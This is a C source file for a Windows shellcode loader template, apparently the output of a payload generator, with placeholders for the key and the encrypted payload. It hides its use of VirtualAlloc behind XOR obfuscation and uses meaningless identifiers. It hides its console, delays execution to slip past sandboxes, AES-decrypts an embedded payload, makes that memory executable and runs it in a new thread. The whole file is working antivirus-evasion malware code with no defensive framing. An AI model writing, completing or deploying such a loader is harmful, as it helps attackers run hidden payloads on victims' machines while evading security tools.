#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <string.h>
#include <tlhelp32.h>


LPVOID (WINAPI * Vor_AlL)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

char XOR_VARIABLE []= "XOR_KEY";

unsigned char Random9 []= VIRALO}; 

static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");



static void SleepShort(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

int Random1(char * difern, unsigned int difern_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, difern, &difern_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


void RandomA(char * tadaks, size_t tadaks_len, char * XOR_VARIABLE, int XOR_VARIABLE_len) {
       int r;
      r = 0;
      for (int i = 0; i < tadaks_len; i++) {
              if (r == XOR_VARIABLE_len - 1) r = 0;

               tadaks[i] = tadaks[i] ^ XOR_VARIABLE[r];
             r++;
   }
}

int main(void) {
	
	void * Random6_mem;
	BOOL Random8;
	HANDLE th;
        DWORD oldprotect = 0;
	

	char Random2[] = KEYVALUE
	unsigned char Random3[] = PAYVAL
	unsigned int Random7_len = sizeof(Random3);
	
        unsigned char skEr[]= {'k','e','r','n','e','l','3','2','.','d','l','l', 0x0};   

	int pido = 0;
        HANDLE hProc = NULL;	
	
	FreeConsole();

	RandomA((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
	
	SleepShort(3000);
 
    Vor_AlL= GetProcAddress(GetModuleHandle(skEr), Random9);

	Random6_mem = Vor_AlL(0, Random7_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  
	SleepShort(3000);

	Random1((char *) Random3, Random7_len, Random2, sizeof(Random2));

	RtlCopyMemory(Random6_mem, Random3, Random7_len);

	SleepShort(3000);

	Random8 = VirtualProtect(Random6_mem, Random7_len, PAGE_EXECUTE_READ, &oldprotect);

	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Random6_mem, 0, 0, 0);
	
	SleepShort(1500);	

	WaitForSingleObject(th, -1);
	
	
	return 0;
}
	

